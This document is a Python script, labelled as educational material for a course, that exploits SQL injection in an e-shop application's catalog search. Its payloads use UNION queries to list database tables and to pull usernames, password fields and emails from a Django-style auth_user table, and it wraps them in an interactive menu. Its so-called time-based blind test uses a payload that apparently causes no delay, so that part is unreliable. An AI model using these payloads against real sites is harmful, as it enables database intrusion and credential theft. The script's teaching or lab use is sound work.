#!/usr/bin/env python3
"""
SQL Injection Exploitation Script for E-Shop Application
Educational Purpose Only - Part of CDS201 Course

This script demonstrates SQL injection vulnerabilities in the search functionality.
"""

import requests
import sys
import urllib.parse
from colorama import init, Fore, Style

# Initialize colorama for colored output
init(autoreset=True)

BASE_URL = "http://localhost:8000"


class SQLInjectionExploit:
    def __init__(self, base_url=BASE_URL):
        self.base_url = base_url
        self.session = requests.Session()
        
    def test_vulnerability(self):
        """Test if the target is vulnerable to SQL injection"""
        print(f"{Fore.YELLOW}[*] Testing SQL injection vulnerability...")
        
        # Test payload that should return all products if vulnerable
        payload = "' OR '1'='1"
        response = self.session.get(f"{self.base_url}/catalog/?q={urllib.parse.quote(payload)}")
        
        if response.status_code == 200 and "product" in response.text.lower():
            print(f"{Fore.GREEN}[+] Target appears to be vulnerable to SQL injection!")
            return True
        else:
            print(f"{Fore.RED}[-] Target does not appear to be vulnerable")
            return False
    
    def extract_database_info(self):
        """Extract database information using UNION-based injection"""
        print(f"{Fore.YELLOW}[*] Extracting database information...")
        
        # PostgreSQL/SQLite version payload
        payloads = {
            "SQLite Version": "' UNION SELECT NULL,sqlite_version(),NULL,NULL,NULL,NULL,NULL--",
            "Current Database": "' UNION SELECT NULL,'Current DB',NULL,NULL,NULL,NULL,NULL--"
        }
        
        for info_type, payload in payloads.items():
            try:
                response = self.session.get(f"{self.base_url}/catalog/?q={urllib.parse.quote(payload)}")
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[+] {info_type} extraction attempted")
            except Exception as e:
                print(f"{Fore.RED}[-] Error extracting {info_type}: {e}")
    
    def extract_users(self):
        """Extract user credentials from auth_user table"""
        print(f"{Fore.YELLOW}[*] Attempting to extract user credentials...")
        
        # Union-based payload to extract users
        payload = "' UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL FROM auth_user--"
        
        try:
            response = self.session.get(f"{self.base_url}/catalog/?q={urllib.parse.quote(payload)}")
            
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] User extraction query executed successfully")
                print(f"{Fore.CYAN}[*] Check the page source for extracted data")
                
                # Try to parse usernames from response
                if "admin" in response.text:
                    print(f"{Fore.GREEN}[+] Admin user found in response!")
                    
        except Exception as e:
            print(f"{Fore.RED}[-] Error extracting users: {e}")
    
    def extract_tables(self):
        """Extract table names from the database"""
        print(f"{Fore.YELLOW}[*] Attempting to extract table names...")
        
        # SQLite specific payload
        payload = "' UNION SELECT NULL,name,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--"
        
        try:
            response = self.session.get(f"{self.base_url}/catalog/?q={urllib.parse.quote(payload)}")
            
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Table extraction query executed successfully")
                
                # Common Django tables to look for
                django_tables = ['auth_user', 'django_session', 'eshop_product', 'eshop_order']
                for table in django_tables:
                    if table in response.text:
                        print(f"{Fore.GREEN}[+] Found table: {table}")
                        
        except Exception as e:
            print(f"{Fore.RED}[-] Error extracting tables: {e}")
    
    def blind_sql_injection(self):
        """Demonstrate time-based blind SQL injection"""
        print(f"{Fore.YELLOW}[*] Testing time-based blind SQL injection...")
        
        # Time-based payload (SQLite specific)
        payload = "' OR (SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)) ELSE 1 END)--"
        
        import time
        start_time = time.time()
        
        try:
            response = self.session.get(f"{self.base_url}/catalog/?q={urllib.parse.quote(payload)}")
            elapsed_time = time.time() - start_time
            
            print(f"{Fore.CYAN}[*] Response time: {elapsed_time:.2f} seconds")
            
            if elapsed_time > 2:
                print(f"{Fore.GREEN}[+] Possible time-based SQL injection detected!")
            
        except Exception as e:
            print(f"{Fore.RED}[-] Error in blind injection test: {e}")
    
    def dump_specific_user(self, username):
        """Extract specific user information"""
        print(f"{Fore.YELLOW}[*] Attempting to extract data for user: {username}")
        
        payload = f"' UNION SELECT NULL,username,email,NULL,NULL,NULL,NULL FROM auth_user WHERE username='{username}'--"
        
        try:
            response = self.session.get(f"{self.base_url}/catalog/?q={urllib.parse.quote(payload)}")
            
            if response.status_code == 200 and username in response.text:
                print(f"{Fore.GREEN}[+] Successfully queried user: {username}")
            
        except Exception as e:
            print(f"{Fore.RED}[-] Error extracting user data: {e}")
    
    def automated_scan(self):
        """Run all SQL injection tests automatically"""
        print(f"{Fore.CYAN}{Style.BRIGHT}=== SQL Injection Automated Scan ==={Style.RESET_ALL}")
        print(f"{Fore.CYAN}Target: {self.base_url}")
        print(f"{Fore.CYAN}{'='*40}")
        
        # Test vulnerability
        if not self.test_vulnerability():
            return
        
        # Run all extraction methods
        print(f"\n{Fore.YELLOW}[*] Running extraction modules...")
        self.extract_database_info()
        print()
        self.extract_tables()
        print()
        self.extract_users()
        print()
        self.blind_sql_injection()
        print()
        self.dump_specific_user("admin")
        
        print(f"\n{Fore.GREEN}{Style.BRIGHT}[+] SQL Injection scan completed!")
        print(f"{Fore.YELLOW}[!] Remember: This is for educational purposes only!")


def main():
    """Main function to run the SQL injection exploit"""
    
    print(f"{Fore.CYAN}{Style.BRIGHT}")
    print("=" * 50)
    print("SQL Injection Exploit - E-Shop Application")
    print("Educational Purpose Only - CDS201 Course")
    print("=" * 50)
    print(f"{Style.RESET_ALL}")
    
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = BASE_URL
    
    exploit = SQLInjectionExploit(base_url)
    
    while True:
        print(f"\n{Fore.CYAN}Select an option:")
        print("1. Run automated scan")
        print("2. Test vulnerability")
        print("3. Extract database info")
        print("4. Extract user credentials")
        print("5. Extract table names")
        print("6. Test blind SQL injection")
        print("7. Extract specific user")
        print("0. Exit")
        
        try:
            choice = input(f"{Fore.YELLOW}Enter choice: {Style.RESET_ALL}")
            
            if choice == "1":
                exploit.automated_scan()
            elif choice == "2":
                exploit.test_vulnerability()
            elif choice == "3":
                exploit.extract_database_info()
            elif choice == "4":
                exploit.extract_users()
            elif choice == "5":
                exploit.extract_tables()
            elif choice == "6":
                exploit.blind_sql_injection()
            elif choice == "7":
                username = input(f"{Fore.YELLOW}Enter username to extract: {Style.RESET_ALL}")
                exploit.dump_specific_user(username)
            elif choice == "0":
                print(f"{Fore.GREEN}[+] Exiting...")
                break
            else:
                print(f"{Fore.RED}[-] Invalid choice!")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Interrupted by user")
            break
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}")


if __name__ == "__main__":
    main()